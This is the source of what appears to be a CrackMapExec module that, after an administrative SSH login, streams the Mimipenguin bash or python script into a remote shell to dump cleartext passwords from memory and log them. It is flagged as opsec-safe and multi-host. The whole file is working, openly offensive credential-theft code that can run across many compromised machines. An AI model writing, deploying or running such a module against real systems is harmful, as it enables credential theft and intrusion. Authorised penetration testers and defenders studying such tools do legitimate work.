from cme.helpers.bash import get_script
from sys import exit

class CMEModule:
    '''
        Runs the Mimipenguin script to dump credentials from memory
        Module by @byt3bl33d3r

    '''
    name = 'mimipenguin'
    description = 'Dumps cleartext credentials in memory'
    supported_protocols = ['ssh']
    opsec_safe= True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        SCRIPT  Script version to execute (choices: bash, python) (default: bash)
        '''
        scripts = {'PYTHON': get_script('mimipenguin/mimipenguin.py'),
                   'BASH' : get_script('mimipenguin/mimipenguin.sh')}

        self.script_choice = 'BASH'
        if 'SCRIPT' in module_options:
            self.script_choice = module_options['SCRIPT'].upper()
            if self.script_choice not in scripts.keys():
                context.log.error('SCRIPT option choices can only be PYTHON or BASH')
                exit(1)

        self.script = scripts[self.script_choice]

    def on_admin_login(self, context, connection):
        if self.script_choice == 'BASH':
            stdin, stdout, stderr = connection.conn.exec_command("bash -")
        elif self.script_choice == 'PYTHON':
            stdin, stdout, stderr = connection.conn.exec_command("python2 -")

        stdin.write("{}\n".format(self.script))
        stdin.channel.shutdown_write()
        context.log.success('Executed command')
        for line in stdout:
            context.log.highlight(line.strip())
